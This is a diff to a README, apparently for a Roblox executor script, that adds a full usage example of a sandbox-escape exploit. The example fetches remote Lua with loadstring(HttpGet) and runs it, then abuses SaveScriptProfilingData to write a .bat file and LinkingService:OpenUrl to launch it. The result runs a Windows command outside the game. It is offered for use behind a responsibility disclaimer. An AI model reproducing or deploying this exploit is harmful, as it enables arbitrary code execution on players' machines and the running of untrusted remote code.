@@ -12,6 +12,20 @@ To use this script, simply execute the following code in your Roblox executor:
 local bypassed_game = loadstring(game:HttpGet("https://raw.githubusercontent.com/dimbox-idk/env_escape/main/escape.lua"))()
 ```
 
+Full example:
+``Lua
+local bypassed_game, why = loadstring(game:HttpGet("https://raw.githubusercontent.com/dimbox-idk/env_escape/main/escape.lua"))()
+
+if bypassed_game ~= "Failed" and bypassed_game ~= "UnSupported" then
+	local L, S = bypassed_game:GetService("LinkingService"), bypassed_game:GetService("ScriptContext")
+	L:OpenUrl(S:SaveScriptProfilingData([[START C:\WINDOWS\system32\notepad.exe]], "lol.bat"))
+elseif why ~= nil then
+	print(why)
+else
+    print(bypassed_game)
+end
+```
+
 ## Disclaimer
 
 By using this code, you are fully responsible for your actions. The author does not take any responsibility for any misuse or consequences resulting from the use of this code.
